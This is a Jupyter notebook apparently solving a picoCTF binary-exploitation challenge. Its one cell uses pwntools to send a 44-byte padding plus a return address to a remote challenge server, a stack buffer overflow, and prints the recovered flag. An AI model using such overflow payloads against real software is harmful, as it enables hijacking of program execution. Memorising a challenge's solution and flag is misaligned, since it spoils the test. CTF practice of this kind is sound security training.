{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 16,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[x] Opening connection to saturn.picoctf.net on port 55722\n",
      "[x] Opening connection to saturn.picoctf.net on port 55722: Trying 13.59.203.175\n",
      "[+] Opening connection to saturn.picoctf.net on port 55722: Done\n",
      "[x] Receiving all data\n",
      "[x] Receiving all data: 0B\n",
      "[x] Receiving all data: 36B\n",
      "[+] Receiving all data: Done (36B)\n",
      "[*] Closed connection to saturn.picoctf.net port 55722\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "b'picoCTF{addr3ss3s_ar3_3asy_b15b081e}'"
      ]
     },
     "execution_count": 16,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "from pwn import ELF, context, remote, FmtStr, fmtstr_payload, p32\n",
    "import re\n",
    "r = remote('saturn.picoctf.net', 55722)\n",
    "r.recvuntil(b'Please enter your string: ')\n",
    "r.sendline(b\"a\"*44+p32(0x080491fa))\n",
    "r.recvline()\n",
    "r.recvline()\n",
    "r.recvall()"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": ".venv",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.11.6"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
